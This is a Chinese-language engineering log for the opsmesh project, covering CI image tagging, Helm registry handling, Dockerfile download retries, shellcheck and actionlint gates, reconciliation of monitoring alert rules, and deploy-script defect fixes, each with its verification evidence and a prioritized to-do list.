  都有 `cmd/<svc>` 且内含 `package main`，反方向也断言（有该布局却不在矩阵/豁免表 = 忘发镜像的真服务），
  并断言豁免表每条都有理由且目录真实存在。**故障注入**：把 `- tf-provider` 放回矩阵
  → 第 10 节立即 `[FAIL] … 没有 Dockerfile.service 要求的 cmd/<svc> 目录： tf-provider` 且整体 rc=1；
  还原 → `PASS=34 FAIL=0 SKIP=0`。
- **顺带暴露的第二个问题（待决）**：标签切到 `v0.9.2`，而**版本源还写着 0.9.0**
  （`Chart.yaml` 的 version/appVersion、`values-production.yaml` 三处 tag、gitops segment、
  `internal/version/version.go` 默认值）。产物本身不受影响（goreleaser 用 `{{.Version}}`、
  镜像用 `--build-arg VERSION` 从标签注入），但**按生产 values 装 Helm 的客户会部署到 0.9.0**
  ——又是"声明与事实不互相校验"，只是这次是版本维度。修法见 §23 待办：随发布 bump 版本源并让第 1 节核对。

## 20. 镜像发布名与消费方引用的对齐（把 §19.4 的两个待决项做掉，2026-09-26）

§19.4 留下两条需要拍板的开口，本轮按「不改变对外契约的最小正确解」处理：

| # | 缺陷 | 处置 | 为什么是这个方向 |
|---|---|---|---|
| 1 | CI 推 `ghcr.io/levango7/opsmesh-binary\|opsmesh-agent` 且**只有 sha 标签**，而 chart 与全部文档默认 `opsmesh/opsmesh:latest` | 两边同时收敛：chart/文档改用 **CI 的实际发布名**，CI 补齐**标签策略** | 只改 chart 会留下「名字对得上但 `:latest` 不存在」；只改 CI 标签则名字仍旧。任修一半都还是 `ErrImagePull` |
| 2 | `global.imageRegistry` 与「已含主机的 repository」无条件拼接 | `templates/_helpers.tpl` 改为**首段含 `.`/`:`/`localhost` 即视为已限定**，不再叠加前缀 | 与 Docker 自身的判定规则一致；不改则 16 个微服务默认值 + 任何设了前缀的用户必然产出 `reg/ghcr.io/...` |

同步改名的消费面：`values.yaml`、`values-production.yaml`、`docs/deployment-guide.md`（CRD 示例）、
`docs/deployment-scenarios.md`（4 处 values + 2 处 image + 构建/推送命令 + 镜像说明 + 私有仓库示例去掉尾斜杠）、
`docs/operations.md`（kustomize 编辑示例）、`operator/config/crd/bases/*.yaml`（CRD 默认值）与
`operator/config/samples/*.yaml`（两份样例），以及 `values.yaml` 顶部指向不存在仓库的文档链接。

### 20.1 标签策略（`image` / `image-agent` 两个 job 同步，脚本由同一份生成）

| 触发 | 推送标签 |
|---|---|
| 任何 push | `:<sha>`（不可变，GitOps 写回的锚点） |
| 默认分支 `main` | 追加 `:latest` |
| tag `vX.Y.Z` | 追加 `:X.Y.Z`（剥掉前导 v）与 `:latest` |

feature 分支**刻意不打** `latest`：否则 `latest` 会被「最后合入者之外」的推送改写，
变成一个由分支推送顺序决定的隐式发布通道。口径与 `release.yml` 的微服务镜像一致（那边一直推 `:latest`）。

**验证方式**：把生成后的两个 step 脚本从 yaml 里抽出来，用 bash 直接喂环境变量跑，逐场景核对
`$GITHUB_OUTPUT` 的实际内容（不是读代码确认）：

| 场景 | 结果 |
|---|---|
| `main` push（无三凭证） | `mode=ghcr`，标签 = `:<sha>` + `:latest` |
| feature 分支 push | `mode=ghcr`，标签 = `:<sha>`（无 latest）✓ 刻意 |
| `v9.9.9` tag | `mode=ghcr`，标签 = `:<sha>` + `:9.9.9` + `:latest` |
| agent job（同逻辑另一 leaf） | `prefix` 落到 `…/opsmesh-agent` ✓ |
| 三凭证齐备 + `main` | `mode=private`，前缀 = `<REGISTRY>/<leaf>`，标签同上 |
| 抽掉 `IMAGE_LEAF` | **rc=1**，`${IMAGE_LEAF:?…}` 直接报错 ⇒ 不会静默产出半套标签 |

**CI 真跑已证实同一件事（run `36198676177`，commit `21bae16`，push 到 main）**——本机 bash 场景测试之外，真实发布链路兑现了承诺。推送后用匿名 token 探 GHCR：

```text
ghcr.io/levango7/opsmesh-binary:latest -> 200
ghcr.io/levango7/opsmesh-agent:latest  -> 200
```

而这两条在 §19.4 取证时**都是 404**（当时只有 sha 标签）。同一 run 里 `build-test`（含新的 actionlint step）、`security`（含 §7/§8 两道新门禁与 helm 三条新断言）、`services`、`integration`、`proto`、`release-dryrun`、`image`、`image-agent`、E2E×2、Frontend 全部 success。

**再往强里证一层（run `36205827115`，commit `a3d0d3b`）**：`:latest` 光有 200 只能说明"这个名字存在"，不能说明它指向**这次**推送。于是比对 manifest 摘要——`latest` 与 `:<完整 sha>` 两条标签的 `docker-content-digest` **逐字相同**：

```text
opsmesh-binary  latest=sha256:d113e53c6196…  sha(a3d0d3b)=sha256:d113e53c6196…  一致=YES  标签数=25
opsmesh-agent   latest=sha256:19794ff4ed26…  sha(a3d0d3b)=sha256:19794ff4ed26…  一致=YES  标签数=24
```

⇒ "`latest` 随默认分支推送前移"这条策略在注册表侧成立，而不只是在 step 里被拼进 `tags`。
（探针坑复用 §19.4 那条：`Accept` 必须含 `application/vnd.oci.image.index.v1+json`；且标签用的是
**完整 40 位 sha**——用 7 位短 sha 探会得到 404，那是探针写错，不是发布失败。本轮就差点把自家探针的 404 当成缺陷报出去。）


生成过程中踩到两处**生成期**缺陷（都属「看起来对、实际少东西」，值得单独记）：

1. 多行值写 `$GITHUB_OUTPUT` **必须**用 heredoc 定界符（`tags<<TAGSEOF` … `TAGSEOF`）。
   直接 `echo "tags=多行"` 只会取到第一行，`tags` 静默退化成单个 `:<sha>`——正是本项目反复出现的形态。
2. 前缀与标签集必须由**同一个** `IMAGE_LEAF` env 派生。生成器一度把 leaf 名内联进 `PREFIX`，
   于是 env 成了摆设、注释宣称的「只有一个来源」与实际的两个来源矛盾。已改为 4 处 `PREFIX` 全用 `${IMAGE_LEAF}`。

### 20.2 防再次分叉（三道机器判定，全部做过故障注入）

| 门禁 | 断言 | 故障注入结果 |
|---|---|---|
| `validate-deploy-assets.sh` §7 | chart 每个 `image.repository` 的**叶子名**必须落在「CI 发布名集合」=（`release.yml` 矩阵 ∪ `ci.yml` 的 `IMAGE_LEAF`）内；默认值必须自带 registry 主机（判定口径与 helper 严格一致） | 把 `values.yaml` 改回 `opsmesh/opsmesh` → `[FAIL] chart 引用了 CI 从不推送的镜像名：opsmesh/opsmesh`；还原 → PASS |
| `security` job 的 helm 段 | 默认渲染必须是 `ghcr.io/levango7/opsmesh-binary:latest` 与 `…/opsmesh-agent:latest`；digest 断言换成真实发布名；设了 `global.imageRegistry` 时**不得**出现 `registry/ghcr.io/…` 双前缀 | 本机四组渲染逐条比对：默认值 / 叶子名+前缀 / 全名+前缀 / digest 优先，均符合预期 |
| `validate-deploy-assets.sh` §8（新增） | 任何 Dockerfile 的字面 `COPY` 源必须存在于仓库，且**不得同时被 `.gitignore` 排除** | 把 §19.1 那行改回 `COPY go.work go.work.sum ./` → `[FAIL] COPY 源同时被 .gitignore 排除：Dockerfile.service:go.work.sum`；还原 → PASS=29 FAIL=0 |

§8 是第一性原理那条：**「本地能构建、干净检出必失败」必须能在静态阶段判定**，而不是等发版那一刻。
它自己实现时也踩了两个坑，均已写进脚本注释：

- `tr -d ' -'` 里的 ` -` 被 tr 解释成 **0x20~0x2D 字符区间**（含 `-` 与全部数字），
  把 `auth-svc` 洗成 `authsvc`；两边集合同时变形后门禁会长期误判。改用 `sed` 定点剥前缀。
- 跨阶段 `COPY --from=build /svc …` 的源来自上一构建阶段而非上下文，首版据此误报 6 条。
  现按「含 `--from=` 的 COPY 整条跳过」处理。

### 20.3 本轮附带关闭的两条长期开口

- **actionlint 进 CI**：`build-test` 新增钉版 v1.7.7 的检查步（本机对全部 workflow 为 0 问题）。
  理由与已抓到的四类「CI 自己骗自己」同源——workflow 是交付物，此前却只在作者本机跑过。
- **`opsmesh-binary` 与外部 GitOps chart 的关系**：私有仓库路径的 leaf 名保持**逐字不变**
  （向后兼容既有 GitOps 写回），同时仓库内 chart 现在用的就是这个 leaf 名，
  两边命名关系从此可被 §7 静态核对。仍存的不确定只剩外部 chart 的 values 结构
  （它写的是 `.global.image.tag/digest`，本仓是 `.controlplane.image.*`），需要该仓库权限，列入 §23。

### 20.4 明确不做的事

- **没有重切版本（`v0.9.2`）**：打 tag 会对外发布 Release 与镜像，属需授权动作；且应先看到
  `release-dryrun` 与新标签策略下的 `image` job 真跑绿。**这是下一轮第一优先级**——
  否则「P0/P1 修复只存在于源码、不存在于任何可安装产物」的状态没有被改变。
- **没有改 Release 的创建逻辑**：v0.9.1 那个 `assets=0` 的空壳 Release，其 `createdAt` 早于
  两条 workflow 启动 5 秒，而两条发布路径当时都判 `skipped` ⇒ 它是打 tag 时由外部（人工）创建的，
  不是流水线行为。流水线自身的门禁（`github-release` needs `build-and-push`）经核是正确的，无需改。


### 20.5 `release-dryrun` 首跑就抓到一个真实脆弱点：代理抖动会让整批发版失败

新门禁上线后第一次跑（run `36190011844`，commit `b343316`）就红了，红在第 4 步：

```
#20 ERROR: process "/bin/sh -c go mod download && go mod verify" did not complete successfully: exit 1
go: cloud.google.com/go/auth@v0.18.2: read "https://goproxy.cn/cloud.google.com/go/auth/@v/v0.18.2.info": …
```

同一份代码在下一个 run（`36190483281`，commit `c78532e`）里 step 全绿 ⇒ 判为外部抖动而非断言失败。
**但这条路径的性质使然**：`release.yml` 的镜像矩阵是 fail-fast（v0.9.1 实测「1 红 + 17 cancel」），
所以任何一次代理截断都会让整批发版失败——这不是"偶发红一下"，是**发布成功率的结构性风险**。

处置（四个 Dockerfile 同步：`Dockerfile`、`Dockerfile.agent`、`Dockerfile.service`、
`deploy/docker/Dockerfile.controlplane`）：`go mod download` 改为 5 次退避重试（5/10/15/20s），
**`go mod verify` 一次都不省**，重试用尽仍失败就明确 `exit 1` 并说明"不是抖动，是真取不到模块"。
边界写清楚：抖动是外部服务的性质，重试不改变正确性判定；`go.sum` 哈希仍然生效，坏下载无论如何过不了 verify。

验证（不给"永远 PASS"留口子，两个方向都测）：

| 方式 | 结果 |
|---|---|
| 把 `RUN` 的续行还原成 shell，用**计数型假 `go`** 注入 | 抖动 2 次 → 第 3 次成功 → `verify` 照跑 → rc=0；持续失败 → 恰好 5 次尝试 → 打印判定语 → **rc=1**（不会静默绿） |
| 真实 `docker buildx build --file Dockerfile.service`（本机 Docker，干净旗标） | **rc=0**，构建日志里能看到新的 `RUN set -eu; ok=0; for i in 1 2 3 4 5 …` 整段被执行；产物照常生成 |
| 静态门禁 §8（COPY 源 vs `.gitignore`）在改完四个 Dockerfile 后复跑 | PASS=29 / FAIL=0 / SKIP=0 |

顺带一条实现坑（写进了 Dockerfile 注释）：这些说明**必须放在 `RUN` 之上**。
本项目已经因"续行行尾"炸过一次（`RUN …  \` 变成 CR+LF 时 Docker 识别不到续行），
而把 `# 注释`写进续行中间同样会让解析器在该行截断指令——第一版就踩了，改回 shell 体内只用 `echo`。

### 20.6 新上的 actionlint 门禁首跑就把自己的本机检查证伪了

`actionlint` 步进 `build-test` 之后，**第一次 CI 运行就红了**（run `36195037306`，step 8）：
报出 **12 条** shellcheck 级问题，横跨三个 workflow：

| 类型 | 条数 | 位置与性质 |
|---|---|---|
| SC2046 词分裂 | 2 | `go test … $(go list ./... \| grep -v …)`（build-test 的 pkgs 批、race job 的同款）——这里词分裂是**故意的**，但写法确实脆：加引号会把整份清单变成一个参数 |
| SC2155 声明即赋值 | 1 | `export PATH="$(go env GOPATH)/bin:$PATH"`——`export` 的退出码盖掉 `go env` 的，go env 失败时 PATH 静默不变 |
| SC2034 循环变量未用 | 4 | `for i in $(seq 1 N); do …`（轮询等待，`i` 从不用） |
| SC2035 裸 glob | 2 | `chmod 644 *.key *.crt`（文件名以 `-` 开头会被当选项） |
| SC2086 未加引号 | 2 | `release.yml` 的 `VERSION=${GITHUB_REF_NAME#v}` 与 `>> $GITHUB_OUTPUT` |
| SC2129 重复重定向 | 1 | `shadow-observe.yml` 三次 `echo … >> $GITHUB_OUTPUT` |

**更值得记的是这条元事实**：本机此前多次跑 `actionlint` 都是 **0 问题**，CI 却报 12 条。
原因不在版本（都是 v1.7.7），而在 **actionlint 只在 `shellcheck` 在 PATH 上时才做 shell 分析**——
本机没装 shellcheck，于是那半个门禁是瞎的。这与 §18「grep 看不见 CR 的门禁在 Windows 上永远 PASS」
同族：**门禁的取证能力取决于它的后端工具是否真的在场**，而工具缺失通常不报错，只表现为"干净"。
处置：本机装上 shellcheck v0.10.0 后，12 条在本机逐条复现，之后全部在推送前修完。

修法（都是真修，没有一条靠 `# ignore` 压掉）：

- 两处 `$(go list …)` 改成 `mapfile -t PKGS < <(go list …)` + `"${PKGS[@]}"`：既不词分裂，也不把清单并成一个参数。
  顺带补上**空清单判红**——`go test "${PKGS[@]}"` 在零参数时 `build-test` 那批会退化成整模块单批
  （正是分批要避开的内存峰值场景），race 那批会退化成"只测当前目录"（静默少跑），
  而 process substitution 里 `go list` 的失败**不会触发 `set -e`**，不判就是无声漏跑。
- `GO_BIN_ROOT="$(go env GOPATH)"` 与 `export PATH=…` 拆成两行。
- 轮询循环 `for i in` → `for _ in`（4 处）；`chmod 644 *.key *.crt` → `./*.key ./*.crt`；
  `VERSION="${GITHUB_REF_NAME#v}"`、`>> "$GITHUB_OUTPUT"` 加引号；三段输出合并成 `{ …; } >> "$GITHUB_OUTPUT"`。

验证口径（如实分层，不写成「本机全绿」）：

- **复现**：本机补上门禁后端（shellcheck）后，`actionlint` 报出的正是 CI 那 12 条（同一集合，不多不少）⇒ 复现成立。
- **修复**：把改动前后的两种写法各做成一个最小脚本跑 `shellcheck`——`before.sh` 报出
  SC2034 / SC2035 / SC2046 / SC2086 / SC2155 共 9 处，`after.sh` 在 `-S warning` 下 **0 报告、rc=0**；
  数组语义另做行为验证：`run_batch` 收到 9 个独立参数（没被并成一个），空清单元素数为 0 会被守卫拦下。
- **未做**：本机没有把整份 `actionlint` 跑到底——装上 shellcheck 后全量运行超过 10 分钟仍未结束
  （CI 侧同一检查 0.7 秒完成，差在 Windows 逐脚本起进程的成本）。因此**最终结论以 CI 的 actionlint step 为准**，
  本机证据只覆盖「复现 + 逐类修复模式正确」，不含「整仓 workflow 全清」。

## 21. 监控资产对账：出厂告警有一批"永远不可能触发"（2026-09-26）

起因是清单里那条长期挂着的开口——"`/metrics` 在 8080 与 9091 返回不同序列集"。
把它当真去查，结论比"两个端口不一样"严重得多：**Prometheus 只抓 9091，
而出厂规则/面板引用的一批序列在 9091 上根本不存在**。

### 21.1 实测证据（本机独立实例，抓真实 9091）

| 被引用的序列 | 出处 | 9091 命中 | 后果 |
|---|---|---|---|
| `http_requests_total` | HighErrorRate + 总览面板 | 0（真名 `opsmesh_http_requests_total`） | 规则恒 no data |
| `http_request_duration_seconds_bucket` | HighLatency + 面板 | 0 | 同上 |
| `opsmesh_tasks_failed_total` | TaskExecutionFailed | 0（真名 `opsmesh_tasks_total{status="failed"}`） | 同上 |
| `opsmesh_device_status` | DeviceOffline | 0（**全仓从未产出过这个指标**） | 同上 |
| `process_cpu_seconds_total` | HighCPUUsage + CPU 面板 | 0（注册表只有 start_time/rss/vms/pid） | 同上 |
| `node_filesystem_*` | DiskSpaceLow | 0（栈里没有 node_exporter） | 同上 |
| `opsmesh_alerts_total{severity}`、`opsmesh_grpc_request_total`、`opsmesh_leader_elections_total` | operations.md 指标表 | 0（代码里从未实现） | 客户照文档接监控→空面板 |

关键在于**这类缺陷不会报错**：PromQL 语法合法，而 Prometheus 对无数据的处置就是不评估。
CI 也看不见，因为它只跑代码测试与静态清单，没有任何一处把"规则引用的名字"与"实际渲染的序列"放在一起对过账。
客户侧的表现是：出事那天没有告警——这与 §20 的镜像命名、§19 的发布链路是同一族问题：**声明与事实从不互相校验**。

### 21.2 处置

| 层面 | 改动 |
|---|---|
| 两个端口一份渲染 | 8080 与 9091 共用 `Server.writeMetricsBody`（`internal/controlplane/metrics_endpoint.go`）；"某序列只在另一个端口有"从此结构上不可能 |
| 补齐抓取面 | `internal/metrics` 新增应用级仪表值：`opsmesh_devices_total`、`opsmesh_device_status{status="online\|offline"}`、`opsmesh_alerts_active`、`opsmesh_tickets_open`（**0 值也恒定输出**，冷启动就能看到"0/0"而不是缺序列）；设备状态只按显式 `online`/`offline` 计数，`discovered`/`provisioning` 不塞进 offline——那会凭空造出掉线告警 |
| 补 CPU | 新增 `process_cpu_seconds_total`（counter，读 `/proc/self/stat` 的 utime+stime）。非 Linux **不输出该序列**而不是输假的 0：假的 0 会让 `rate()` 显示"CPU 空闲"，比缺数据更误导 |
| 规则口径 | `DeviceOffline` 从"离线 > 10 台"改成**占比 > 20%**（10 台的阈值对 20 台小集群永不触发、对 5000 台又太迟钝）；`HighErrorRate`/`HighLatency` 用 `{__name__=~"opsmesh_…\|…"}` **同时覆盖控制面与微服务两套命名**（见下）；直方图补 `sum by (le)`；`opsmesh_tasks_failed_total` 改用真实 counter |
| 主机级规则 | `DiskSpaceLow` 从默认文件移出，落到 `deploy/monitoring/prometheus-alerts.host.example.yml`，头部写明"需要 node_exporter，本栈不含"；另配 `DiskSpaceCritical` |
| 文档 | operations.md §4.1 指标表**重写为与实测一致**，并写明两套命名并存的事实 |

### 21.3 一个必须记住的并存事实：两套 HTTP 指标命名

控制面（`internal/metrics`）导出 `opsmesh_http_requests_total`；微服务（`pkg/metrics`，
目前 device-svc / task-svc / alert-svc 注册了 `/metrics`）导出**无前缀**的 `http_requests_total`。
两类 job 都被 Prometheus 抓取，所以任何按概念写的规则/面板**必须同时覆盖两个名字**——
第一版我只把规则改成带前缀的那种，等于把覆盖面从"全部目标"悄悄缩成"只有控制面"，
是修 bug 时新引入的窄化（已改为 `__name__` 并集，并在 operations.md 写明）。
彻底统一命名会破坏客户已有面板与告警，属版本级破坏性变更，记入待办而不是本轮擅改。

### 21.4 防复发：三条契约测试（都做了故障注入）

`internal/controlplane/metrics_contract_test.go`：

| 测试 | 断言 | 注入验证 |
|---|---|---|
| `TestShippedAlertRulesReferenceExportedMetrics` | 规则文件里表达式引用的每个 `opsmesh_*`/`process_*` 名字，必须在真实渲染的 exposition 里可见 | 把 `opsmesh_device_status` 改成带 typo 的名字 → **FAIL 并点名**；还原 → PASS |
| `TestShippedDashboardsReferenceExportedMetrics` | 出厂 Grafana 面板同罪同判 | 同上（面板引用被清空时**判红而不是静默跳过**） |
| `TestDocumentedMetricsAreExported` | operations.md 指标表第一列的每个名字必须真的能抓到 | 本轮**上线即抓到我刚写错的一行**（把 histogram 家族名写成 `opsmesh_http_request_duration_seconds`，实际导出的是 `_bucket`/`_sum`/`_count`）⇒ 门禁对我的手写字也生效 |
| `TestMetricsPortsServeIdenticalExposition` | 8080 与 9091 的序列名集合必须逐字一致（只比名字不比数值，否则 go_goroutines 会造成偶发失败） | — |

解析细节都写在注释里，避免以后被"顺手简化"掉：只从 `expr:` 行取名字（否则 YAML 的组名
`opsmesh_service_alerts` 会被当指标误判，第一版就误报了 5 条）；同时支持 JSON 里的 `{ "expr": ...` 形态；
外部导出器的序列（`node_*`）走**带理由的显式豁免表**，不塞进通用逻辑。

### 21.5 验证与遗留

- 真机：`opsmesh_device_status{status="online"} 3` / `{offline} 0`、`opsmesh_devices_total 3`、
  `opsmesh_alerts_active 2` 在 9091 可见；8080 与 9091 的序列名集合 md5 相同。
- 代码：`internal/controlplane`（39.2s）与 `internal/metrics` 全绿；`gofmt`/`go vet`/`golangci-lint` 干净；
  `/proc/self/stat` 解析另有 4 个用例（含 comm 带空格与右括号的错位陷阱、畸形输入必须拒绝）。
- 遗留（记入待办，未擅动）：① 统一控制面与微服务的 HTTP 指标命名（破坏性，随版本走）；
  ② 其余 13 个微服务未注册 `/metrics`（现只有 device/task/alert 三个）；
  ③ node_exporter 是否纳入出厂栈（决定主机级告警能否默认可用）。

## 22. 交付脚本第一次被静态检查：三处"哑按钮 + 不实陈述"（2026-09-26）

起因很小：给 `validate-deploy-assets.sh` 加第 9 节时，顺手对 `deploy/scripts/*.sh` 跑了一次 shellcheck。
结果不是 lint 噪音，是**三处真实缺陷**——而它们一直躲着，因为
**CI 的 actionlint 只检查 workflow 里的内联 `run` 块，不会跟进被调用的脚本**，
于是 13 个「客户在生产机上直接执行」的 bash 入口从未被任何静态门禁看过一眼。

### 22.1 三处真实缺陷

| # | 缺陷 | 表现 | 处置 |
|---|---|---|---|
| 1 | `deploy/k8s/deploy-opsmesh.sh` 的 `--skip-images` 是**哑按钮** | usage 里承诺了它，参数解析把 `SKIP_IMAGES=true` 存进一个**从未被读取**的变量；`load_images()` 只看 `LOAD_IMAGES`。传与不传行为一致，且无人报错 | 与 `--load-images` 共用一个开关（`--skip-images` → `LOAD_IMAGES=false`），并写明"两个都给时最后出现者为准"；哑变量删除 |
| 2 | `deploy.sh` 的 `PASSWORD_SPECIAL_CHARS` **从未被任何代码引用**，而口令生成走 `openssl rand -base64` | 常量上方三段注释认真解释了"为什么排除 `@` `#` `$` `"` `\` 反引号 与空白"，但 base64 字母表含 `/`（不在该集合内）⇒ 生成的口令可以违反自己声明的字符集。这是 §19/§20/§21 同一族的"声明与事实从不互相校验"，只不过发生在凭据上 | 新增 `rand_pw`：字符集严格 ⊆ `[0-9a-f] ∪ PASSWORD_SPECIAL_CHARS`，末位恒为特殊字符（满足"含特殊字符"类策略）；4 个口令改用之。`JWT_SECRET`/`ENCRYPTION_KEY` **刻意不变**（后者必须是合法 base64，解码后要正好 32 字节） |
| 3 | `.env` 生成后**无条件自称"权限 0600"** | `chmod 600 … \|\| true` 在无 POSIX 权限的文件系统（NTFS/Git-Bash）上静默失败，实际仍是 0644，而日志与 `.env` 头注释都说 0600——一句关于凭据保护的不实陈述 | 先 `stat` 实测再陈述：0600 才说 0600，否则 WARN 报出真实 mode 并给平台 ACL 处置建议；`.env` 头注释与部署摘要里另外两处"权限 0600"一并改为不假定结果 |

另有 11 处纯死代码（`logs.sh`/`simulate.sh`/`status.sh` 里从未使用的颜色变量、`status.sh` 的 `COMPOSE_FILE`、
两个脚本的 `SCRIPT_DIR`、`print_access_info` 的 `port_adv`、轮询计数 `attempt` → `_`），以及
`load-test.sh` 的 `target_replicas`：它作为第 3 个参数被解析却从不参与判定，现在真的进入结论
（达标 / 已扩容但未达目标 / 未触发三态），并顺带修掉了 `${max_pods}` 为空时 `[[ -gt ]]` 的报错。

### 22.2 行内孤立 CR：我自己的推送内容里也有杂质

用户对口径的要求是「确保推送上去的不是包含杂质的」。复查方式是全仓扫**跟踪文件**的字节，
结果抓到一处已随 `1bde2b3` 推上 main 的缺陷：`CHANGELOG.md` 某条 bullet 中间有一个**孤立 `\r`**（不在行尾）。

这类字节有三重隐蔽性，值得单独记：

1. `grep`/`awk` 在 Git-Bash 下看不见它（MSYS 文本模式读时吞 CR）——见部署资产门禁第 6 节的同源教训；
2. git 的 CRLF 归一化（`* text=auto`）只处理**行尾**，行内 CR 原样进 blob 并被推送；
3. markdown 渲染器把它当换行 ⇒ 一条 bullet 从句子中间断开，而 GitHub 上的 diff 视图不会highlight它。

修法用 Node 以 latin1 逐字节 splice（读 utf8 写 latin1 会把整个中文文件洗成乱码——本轮之前撞过一次，
靠 `file-history` 快照恢复），改完断言 UTF-8 仍合法且字节数只减 1。

### 22.3 两条新门禁（都做了故障注入）

| 门禁 | 判据 | 为什么这样判 | 注入验证 |
|---|---|---|---|
| `validate-deploy-assets.sh` §9 | `git grep -IP --cached '\r(?!\n)'`——扫**暂存 blob**里的行内 CR | 读工作区必然误报：本机 335 个文件带正常 CRLF 行尾（Windows 检出所致）。问 git 自己，clean filter 已把行尾归一化，剩下任何 CR 都必是真杂质。rc=0 判红、rc=1 判绿、**rc≥2 判红为"门禁失明"**（PCRE 不可用不等于内容干净，见 §20.6 的 shellcheck 教训） | 造一个含行内 CR 的文件 `git add` → 点名；修复前 index 仍是 HEAD 的带 CR 版本 → §9 立刻红，暂存修复后 → 绿（两向都是自然发生的，无需伪造） |
| CI `security` job 的 shellcheck step | 13 个交付脚本 `-S warning` 零 findings | 钉版 v0.10.0 且**断言 `version:` 行**（下到别的版本=门禁强度变了却看不出来）；空清单直接 `::error::`（清单为空不等于脚本干净）；下载 5 次退避（§20.5 教训：一次代理截断=整批门禁失败）；取二进制而非 docker 镜像——本机 Docker 配了镜像白名单代理拉不到 `shellcheck-alpine`，runner 侧则要扛 Docker Hub 匿名限额，同一门禁不该有两种环境失效方式 | 往 `proto/scripts/gen.sh` 追加一行未使用变量 → 报 SC2034 并 rc=1；`git checkout --` 还原 → 0 findings |

版本断言本身也是一次"先测再写"：`shellcheck --version` 首行是
`ShellCheck - shell script analysis tool`，版本在第二行 `version: 0.10.0`——
最初按 `ShellCheck 0.10.0` grep 永远不匹配，会在 CI 里把一个正常门禁写成永久失败。

### 22.4 验证

- `rand_pw`：从 `deploy.sh` 里抽出**真实定义**跑 300 次，断言长度、字符集越界字符为空、至少含一个特殊字符 ⇒ `bad=0`；
  负向自证：故意把校验集合写窄（漏掉 `_`）立刻报 42 处 ⇒ 断言是活的。
- 沙箱真跑：把 `deploy/docker` 复制到 `/tmp` 独立目录（删掉复制来的真实 `.env`/证书，避免把密钥材料扩散），
  跑 `deploy.sh init` → 生成成功，四条口令 len=32、无越界字符、各含特殊字符；`JWT_SECRET`(64)/`ENCRYPTION_KEY`(44) 不变；
  `docker compose --env-file .env -f docker-compose.prod.yml config` rc=0 ⇒ 新字符集在 compose 插值链路上真的可用；
  权限分支本机实测走 WARN（`实际权限为 644`）——即缺陷 #3 的复现与修复同时被看见。
  （顺带发现 `confirm()` 在非 tty 下把**问题本身**印成 `[ERROR]`，已改为一句说明"已按拒绝处理"的 error，不再误导。）
- 全量：13 个脚本 `shellcheck -S warning` 0 findings + `bash -n` 全通过；`gofmt`/`go vet` 干净。
- **CI 已把这两条门禁真跑过（run `36205827115`，commit `a3d0d3b`，13 个 job 全 success）**：
  `security` 的 shellcheck step 打印 `version: 0.10.0` 与
  `✅ 13 个交付脚本在 shellcheck -S warning 下 0 findings`；`部署资产一致性门禁` 在 CI 里
  `PASS=30 FAIL=0 SKIP=0`，且第 9 节输出「全部暂存 blob 无行内孤立 CR」；
  `build-test` 的 actionlint step、E2E×2、`Race detector` 同 run 全绿。
  上面"以 CI 该 step 为准"的口径到此兑现——本机只证到复现与逐类修复。
- 遗留（记入 §23）：`-S info` 级仍有 39 处 SC2015（`a && b || c` 风格）与 3 处 SC2012，属可读性而非正确性，未在本轮动。

## 23. 下一轮清单（按优先级）

| # | 事项 | 为什么排在这 |
|---|---|---|
| 1 | 看本轮 commit 的 CI：`release-dryrun`、`image`、`image-agent`、`security` 的 **step 级**证据 | 标签策略、命名收敛、actionlint 门禁都要靠真跑证实或证伪，本机 bash 只能证一半 |
| 2 | 重切 `v0.9.2`（第一次尝试红在 §19.6 的矩阵缺陷，Release 仍是 0 资产）：修复合入后需**移动/重打标签**，再验收 GitHub Release assets 非空 + `ghcr.io/levango7/*:0.9.2` 可解析 + 签名与 SBOM 齐备 | 商用可交付的最低事实：存在一个版本，其镜像与二进制都真的发布成功。移动公开标签是对外可见动作，需授权 |
| 3 | P1-7 许可与第三方合规（NOTICE/THIRD_PARTY、MPL-2.0 依赖的再分发含义、基础镜像来源目录） | 唯一剩下的 P1 大块，属商务 + 法务判定 |
| 4 | 外部 GitOps chart 的 values 结构核对（需该仓库读权限） | §20.3 遗留的最后一处不确定 |
| 5 | 统一控制面与微服务的 HTTP 指标命名（`opsmesh_http_*` vs 无前缀 `http_*`） | 破坏性变更，需随版本走；当前出厂规则/面板已用 `__name__` 并集兜住（§21.3） |
| 6 | 其余 13 个微服务未注册 `/metrics`（现只有 device/task/alert） | 并集写法目前只能覆盖已开端点的三个；不注册就永远没有它们的数据 |
| 7 | node_exporter 是否纳入出厂栈 | 决定主机级告警（磁盘等）能否默认可用；现在只能以 `.example` 形式提供（§21.2） |
| 8 | 微服务剩余约 250 处 `Printf` 的逐点严重级别升级 | 增量改进，统一管道已就位 |
| 9 | 把交付脚本的 shellcheck 口径从 `-S warning` 提到 `-S info`（余 39×SC2015、3×SC2012） | 可读性而非正确性；提口径前要逐条判"是否真死变量"，与本轮 SC2034 的处置同法，不宜顺手 |
| 10 | **版本源随发布一起 bump**：`Chart.yaml` 的 version/appVersion、`values-production.yaml` 三处 tag、gitops segment、`internal/version/version.go` 默认值仍写 `0.9.0`，而标签是 `v0.9.2` | 产物不受影响（版本由标签经 ldflags/`--build-arg` 注入），但**按生产 values 装 Helm 的客户会部署到 0.9.0**；第 1 节门禁只保证"版本源彼此一致"，不保证"版本源 == 正在发布的标签"，这一格是空的（见 §19.6 末） |
